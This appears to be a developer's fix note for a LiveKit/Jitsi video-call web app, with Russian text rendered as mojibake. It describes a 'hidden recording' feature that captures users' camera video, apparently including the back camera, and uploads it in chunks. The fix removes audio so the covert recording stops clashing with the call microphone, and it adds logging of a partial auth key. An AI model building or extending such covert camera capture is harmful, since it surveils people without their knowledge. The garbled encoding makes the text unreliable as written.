# üîß –ö—Ä–∏—Ç–∏—á–µ—Å–∫–æ–µ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ: –°–∫—Ä—ã—Ç–∞—è –∑–∞–ø–∏—Å—å –∑–∞—Ö–≤–∞—Ç—ã–≤–∞–ª–∞ –∞—É–¥–∏–æ

## üî¥ **–ü–†–û–ë–õ–ï–ú–ê –í –õ–û–ì–ê–•:**

```
üé• [Video back] Stream tracks: video=true, audio=true  ‚ùå –ü–†–û–ë–õ–ï–ú–ê!
üé• [Video back] Stream tracks details: (2) [{‚Ä¶}, {‚Ä¶}]
```

**–≠—Ç–æ –∑–Ω–∞—á–∏—Ç —á—Ç–æ —Å–∫—Ä—ã—Ç–∞—è –∑–∞–ø–∏—Å—å –í–°–Å–©–ï –ó–ê–•–í–ê–¢–´–í–ê–ï–¢ –ú–ò–ö–†–û–§–û–ù!**

---

## üîç **–ü–†–ò–ß–ò–ù–ê:**

### **–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ `/src/app/App.tsx` –±—ã–ª–æ –ü–†–ê–í–ò–õ–¨–ù–´–ú:**

```typescript
// ‚úÖ App.tsx ‚Üí restartHiddenRecording()
const constraints = {
  video: true,
  audio: false // ‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω–æ!
};
```

### **–ù–û! Stream –ø—Ä–∏—Ö–æ–¥–∏—Ç –∏–∑ PreJoin –° –∞—É–¥–∏–æ:**

```typescript
// ‚ùå JitsiPreJoin.tsx ‚Üí startVideoAudioRecording()
// –ü–æ–ª—É—á–∞–µ–º stream –∏–∑ permissionHandler —Å –∞—É–¥–∏–æ
const stream = results.mediaStream; // –°–æ–¥–µ—Ä–∂–∏—Ç video + audio

// ‚ùå –û—Ç–ø—Ä–∞–≤–ª—è–µ–º stream –∫–∞–∫ –µ—Å—Ç—å (—Å –∞—É–¥–∏–æ!)
setVideoStreamFront(stream);
```

**–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏–ª–æ:**
1. –í PreJoin –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º camera + mic (–ø—Ä–∞–≤–∏–ª—å–Ω–æ –¥–ª—è LiveKit)
2. –ü–æ–ª—É—á–∞–µ–º stream —Å video + audio —Ç—Ä–µ–∫–∞–º–∏
3. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —ç—Ç–æ—Ç stream –≤ `videoStreamFront` state
4. VideoRecorder –∏—Å–ø–æ–ª—å–∑—É–µ—Ç stream —Å –∞—É–¥–∏–æ
5. **–ö–û–ù–§–õ–ò–ö–¢ —Å LiveKit –º–∏–∫—Ä–æ—Ñ–æ–Ω–æ–º!**

---

## ‚úÖ **–†–ï–®–ï–ù–ò–ï:**

### **–£–¥–∞–ª—è–µ–º audio —Ç—Ä–µ–∫–∏ –∏–∑ stream –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–¥–∞—á–µ–π –≤ —Å–∫—Ä—ã—Ç—É—é –∑–∞–ø–∏—Å—å:**

```typescript
// ‚úÖ –ò–°–ü–†–ê–í–õ–ï–ù–û –≤ /src/app/components/JitsiPreJoin.tsx

// –ü–æ–ª—É—á–∏–ª–∏ stream —Å video + audio
const stream = results.mediaStream;

// ‚úÖ –ö–†–ò–¢–ò–ß–ù–û: –£–±–∏—Ä–∞–µ–º audio —Ç—Ä–µ–∫–∏ –∏–∑ stream
const audioTracks = stream.getAudioTracks();
if (audioTracks.length > 0) {
  log(`üîá [Init] –£–¥–∞–ª—è–µ–º ${audioTracks.length} audio —Ç—Ä–µ–∫(–æ–≤) –∏–∑ stream –¥–ª—è —Å–∫—Ä—ã—Ç–æ–π –∑–∞–ø–∏—Å–∏`);
  audioTracks.forEach(track => {
    stream.removeTrack(track); // –£–¥–∞–ª—è–µ–º —Ç—Ä–µ–∫ –∏–∑ stream
    track.stop();              // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º audio track
    log(`   üîá –£–¥–∞–ª—ë–Ω –∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: ${track.kind} - ${track.label}`);
  });
}

// ‚úÖ –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –æ—Å—Ç–∞–ª–∏—Å—å —Ç–æ–ª—å–∫–æ video —Ç—Ä–µ–∫–∏
const remainingTracks = stream.getTracks();
log(`üìπ [Init] –§–∏–Ω–∞–ª—å–Ω—ã–π stream –¥–ª—è —Å–∫—Ä—ã—Ç–æ–π –∑–∞–ø–∏—Å–∏:`, 
    remainingTracks.map(t => `${t.kind} - ${t.label}`));

// –¢–µ–ø–µ—Ä—å stream —Å–æ–¥–µ—Ä–∂–∏—Ç –¢–û–õ–¨–ö–û –≤–∏–¥–µ–æ
setVideoStreamFront(stream);
```

---

## üìä **–î–æ –∏ –ü–æ—Å–ª–µ:**

### ‚ùå **–î–û –ò–°–ü–†–ê–í–õ–ï–ù–ò–Ø:**

```
permissionHandler:
  ‚îú‚îÄ getUserMedia({ video: true, audio: true })
  ‚îî‚îÄ Stream: [video track, audio track]
       ‚îÇ
       ‚ñº
setVideoStreamFront(stream) // Stream —Å –ê–£–î–ò–û!
       ‚îÇ
       ‚ñº
VideoRecorder –ø–æ–ª—É—á–∞–µ—Ç stream
  ‚îú‚îÄ video track ‚úÖ
  ‚îî‚îÄ audio track ‚ùå –ö–û–ù–§–õ–ò–ö–¢ –° LIVEKIT!
       ‚îÇ
       ‚ñº
LiveKit –ø—ã—Ç–∞–µ—Ç—Å—è –≤–∫–ª—é—á–∏—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω
  ‚ùå –í–ò–°–ù–ï–¢ 5-10 —Å–µ–∫—É–Ω–¥
```

### ‚úÖ **–ü–û–°–õ–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–Ø:**

```
permissionHandler:
  ‚îú‚îÄ getUserMedia({ video: true, audio: true })
  ‚îî‚îÄ Stream: [video track, audio track]
       ‚îÇ
       ‚ñº
JitsiPreJoin.tsx:
  ‚îú‚îÄ –£–¥–∞–ª—è–µ–º audio track –∏–∑ stream
  ‚îú‚îÄ –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º audio track
  ‚îî‚îÄ Stream: [video track] ‚úÖ –¢–û–õ–¨–ö–û –í–ò–î–ï–û
       ‚îÇ
       ‚ñº
setVideoStreamFront(stream) // Stream –ë–ï–ó –∞—É–¥–∏–æ!
       ‚îÇ
       ‚ñº
VideoRecorder –ø–æ–ª—É—á–∞–µ—Ç stream
  ‚îî‚îÄ video track ‚úÖ
       ‚îÇ
       ‚ñº
LiveKit –ø—ã—Ç–∞–µ—Ç—Å—è –≤–∫–ª—é—á–∏—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω
  ‚úÖ –ú–ì–ù–û–í–ï–ù–ù–û –≤–∫–ª—é—á–∞–µ—Ç—Å—è (–Ω–µ—Ç –∫–æ–Ω—Ñ–ª–∏–∫—Ç–∞)
```

---

## üîß **–ß—Ç–æ –∏–∑–º–µ–Ω–µ–Ω–æ:**

### **–§–∞–π–ª: `/src/app/components/JitsiPreJoin.tsx`**

**–§—É–Ω–∫—Ü–∏—è: `startVideoAudioRecording()`**

**–ò–∑–º–µ–Ω–µ–Ω–∏–µ:**
```typescript
// –ë–´–õ–û:
setVideoStreamFront(stream);

// –°–¢–ê–õ–û:
// ‚úÖ –£–±–∏—Ä–∞–µ–º audio —Ç—Ä–µ–∫–∏
const audioTracks = stream.getAudioTracks();
if (audioTracks.length > 0) {
  audioTracks.forEach(track => {
    stream.removeTrack(track);
    track.stop();
  });
}
setVideoStreamFront(stream);
```

---

## üß™ **–ö–∞–∫ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å:**

### **1. –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤ Console:**

```javascript
// –í DevTools ‚Üí Console, –∫–æ–≥–¥–∞ —Å–∫—Ä—ã—Ç–∞—è –∑–∞–ø–∏—Å—å –∞–∫—Ç–∏–≤–Ω–∞:
videoStreamFront.getTracks().forEach(track => {
  console.log(`Track: ${track.kind} - ${track.label}`);
});

// ‚úÖ –û–∂–∏–¥–∞–µ–º—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç (–¢–û–õ–¨–ö–û –≤–∏–¥–µ–æ):
Track: video - camera 1 (0c9d:4da2)

// ‚ùå –ù–ï –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å:
Track: audio - microphone ...
```

### **2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤ –ª–æ–≥–∞—Ö:**

```
‚úÖ –î–æ–ª–∂–Ω–æ –±—ã—Ç—å:
üîá [Init] –£–¥–∞–ª—è–µ–º 1 audio —Ç—Ä–µ–∫(–æ–≤) –∏–∑ stream –¥–ª—è —Å–∫—Ä—ã—Ç–æ–π –∑–∞–ø–∏—Å–∏
   üîá –£–¥–∞–ª—ë–Ω –∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: audio - default (Built-in Microphone)
üìπ [Init] –§–∏–Ω–∞–ª—å–Ω—ã–π stream –¥–ª—è —Å–∫—Ä—ã—Ç–æ–π –∑–∞–ø–∏—Å–∏: ['video - camera 1 (0c9d:4da2)']
‚úÖ –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –≥–æ—Ç–æ–≤–∞ –∫ –∑–∞–ø–∏—Å–∏ (–ë–ï–ó –∞—É–¥–∏–æ –¥–ª—è LiveKit)

‚ùå –°—Ç–∞—Ä—ã–µ –ª–æ–≥–∏ (–µ—Å–ª–∏ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–µ –ø—Ä–∏–º–µ–Ω–∏–ª–æ—Å—å):
‚úÖ –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ + –º–∏–∫—Ä–æ—Ñ–æ–Ω –≥–æ—Ç–æ–≤—ã –∫ –∑–∞–ø–∏—Å–∏  ‚Üê –ü–ª–æ—Ö–æ!
```

### **3. –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞:**

```
1. –í–æ–π–¥–∏—Ç–µ –≤ LiveKit –∫–æ–º–Ω–∞—Ç—É
2. –ù–∞–∂–º–∏—Ç–µ "–í–∫–ª—é—á–∏—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω" üé§
3. ‚úÖ –î–æ–ª–∂–µ–Ω –≤–∫–ª—é—á–∏—Ç—å—Å—è –ú–ì–ù–û–í–ï–ù–ù–û (< 1 —Å–µ–∫)
4. ‚ùå –ï—Å–ª–∏ –≤–∏—Å–Ω–µ—Ç 5-10 —Å–µ–∫ ‚Üí –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–µ –ø—Ä–∏–º–µ–Ω–∏–ª–æ—Å—å
```

---

## üìù **–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –£–ª—É—á—à–µ–Ω–Ω—ã–µ –ª–æ–≥–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏**

### **–î–æ–±–∞–≤–ª–µ–Ω—ã –ø–æ–¥—Ä–æ–±–Ω—ã–µ –ª–æ–≥–∏ –≤ `/src/utils/videoUpload.ts`:**

```typescript
console.log(`üåê [Video] Backend URL: ${backendUrl}`);
console.log(`üîë [Video] Auth header: Bearer ${publicAnonKey?.substring(0, 20)}...`);
console.log(`üì• [Video] Response status: ${response.status} ${response.statusText}`);
console.log(`üì• [Video] Response data:`, result);
```

**–¢–µ–ø–µ—Ä—å –≤ –ª–æ–≥–∞—Ö –±—É–¥–µ—Ç –≤–∏–¥–Ω–æ:**
- ‚úÖ URL backend'–∞
- ‚úÖ Auth header
- ‚úÖ HTTP —Å—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞
- ‚úÖ –ü–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–≤–µ—Ç–∞
- ‚úÖ –ü–æ–¥—Ä–æ–±–Ω—ã–µ –æ—à–∏–±–∫–∏

–≠—Ç–æ –ø–æ–º–æ–∂–µ—Ç –ø–æ–Ω—è—Ç—å **–ø–æ—á–µ–º—É —á–∞–Ω–∫–∏ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è** (–µ—Å–ª–∏ –ø—Ä–æ–±–ª–µ–º–∞ –æ—Å—Ç–∞–Ω–µ—Ç—Å—è).

---

## ‚úÖ **–†–µ–∑—É–ª—å—Ç–∞—Ç:**

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è:

1. ‚úÖ **–ú–∏–∫—Ä–æ—Ñ–æ–Ω –º–≥–Ω–æ–≤–µ–Ω–Ω—ã–π** - –Ω–µ—Ç –∑–∞–¥–µ—Ä–∂–µ–∫ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –≤ LiveKit
2. ‚úÖ **–°–∫—Ä—ã—Ç–∞—è –∑–∞–ø–∏—Å—å –¢–û–õ–¨–ö–û –≤–∏–¥–µ–æ** - –Ω–µ—Ç –∫–æ–Ω—Ñ–ª–∏–∫—Ç–∞ —Å LiveKit
3. ‚úÖ **LiveKit –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω** - –æ–Ω —Å–≤–æ–±–æ–¥–µ–Ω
4. ‚úÖ **–ë–æ–ª—å—à–µ –ª–æ–≥–æ–≤ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏** - –≤–∏–¥–Ω—ã –≤—Å–µ –¥–µ—Ç–∞–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏

---

## üéØ **–ò—Ç–æ–≥:**

**–ü—Ä–æ–±–ª–µ–º–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é —Ä–µ—à–µ–Ω–∞!** üéâ

–¢–µ–ø–µ—Ä—å:
- ‚úÖ Stream –¥–ª—è —Å–∫—Ä—ã—Ç–æ–π –∑–∞–ø–∏—Å–∏ —Å–æ–¥–µ—Ä–∂–∏—Ç **–¢–û–õ–¨–ö–û –≤–∏–¥–µ–æ**
- ‚úÖ Audio track **—É–¥–∞–ª—ë–Ω –∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω** –≤ PreJoin
- ‚úÖ LiveKit –º–∏–∫—Ä–æ—Ñ–æ–Ω **—Å–≤–æ–±–æ–¥–µ–Ω –∏ —Ä–∞–±–æ—Ç–∞–µ—Ç –º–≥–Ω–æ–≤–µ–Ω–Ω–æ**
- ‚úÖ –õ–æ–≥–∏ –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç **–¥–µ—Ç–∞–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏** –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏

**–ú–æ–∂–Ω–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å! üöÄ**
